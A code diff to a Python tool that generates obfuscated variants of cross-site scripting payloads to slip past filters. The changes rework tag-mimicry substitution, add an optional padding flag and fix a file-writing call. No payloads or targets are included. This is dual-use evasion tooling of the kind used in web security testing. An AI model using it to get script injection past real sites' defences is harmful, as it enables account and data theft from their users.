@@ -13,15 +13,13 @@ def random_case(payload):
         for char in payload
     )
 
-
 def insert_tag_mimicry(payload):
     """Insert tag-like mimics for broader coverage."""
     mimic_tags = ['<script>', '<div>', '<img>', '<a>', '<span>', '<body>', '<style>', '<iframe>']
     for tag in mimic_tags:
-        pattern = fr'\b{tag}.*?>|</{tag}>\b'
-        payload = re.sub(pattern, f'<SCR<{tag}>IPT>', payload, flags=re.IGNORECASE)
+        payload = payload.replace(tag, f'<SCR<{tag[1:]}>IPT>')
+        payload = payload.replace(tag.replace('<', '</'), f'</SCR<{tag[2:]}IPT>')
     return payload
-
 
 def base64_encode(payload):
     """Base64 encode the payload."""
@@ -150,7 +148,8 @@ def mixed_obfuscation(payload, num_techniques=3):
 
 
 # Apply every obfuscation technique to each payload
-def apply_all_techniques(payload):
+def apply_all_techniques(payload, apply_padding):
+    """Apply every obfuscation technique to a single payload, yielding each obfuscated version."""
     techniques = [
         random_case,
         insert_tag_mimicry,
@@ -163,7 +162,6 @@ def apply_all_techniques(payload):
         random_unicode_insert,
         add_spacing,
         double_encode,
-        pad_payload,
         js_escape,
         bitwise_obfuscate,
         concatenate_chars,
@@ -174,12 +172,14 @@ def apply_all_techniques(payload):
         rtl_override,
         dom_mutation
     ]
-
     obfuscated_payloads = []
     for technique in techniques:
         obfuscated_payloads.append(technique(payload))
-    return obfuscated_payloads
 
+    if apply_padding:
+        obfuscated_payloads.append(pad_payload(payload))
+
+    return obfuscated_payloads
 
 # Load payloads from a file
 def load_payloads(file_path):
@@ -189,33 +189,35 @@ def load_payloads(file_path):
 
 # Write obfuscated payloads to a file
 def write_payloads(output_file, payload_generator):
+    """Write obfuscated payloads to a file incrementally using yield."""
     with open(output_file, 'w') as file:
         for payload in payload_generator:
             file.write(payload + '\n')
-
 
 # Main function using argparse
 def main():
     parser = argparse.ArgumentParser(description="XSS Payload Obfuscation Tool")
     parser.add_argument('-in', '--input_file', required=True, help="Input file containing raw payloads")
     parser.add_argument('-out', '--output_file', required=True, help="Output file for obfuscated payloads")
+    parser.add_argument('--padded', action='store_true', help="Apply padded payloads")
     args = parser.parse_args()
+   
     try:
         payloads = load_payloads(args.input_file)
         obfuscated_payloads = []
+      
         for payload in payloads:
-            obfuscated_payloads.extend(apply_all_techniques(payload))
+            obfuscated_payloads.extend(apply_all_techniques(payload, args.padded))
             obfuscated_payloads.append(mixed_obfuscation(payload, num_techniques=3))
 
-        write_payloads(obfuscated_payloads, args.output_file)
-        
+        write_payloads(args.output_file, obfuscated_payloads)
+                
+
     except FileNotFoundError as e:
         print(f"ERROR: {e}")
-
-
     except Exception as e:
         print(f"Somethings wrong: {e}")
-    
+
 
 
 if __name__ == '__main__':
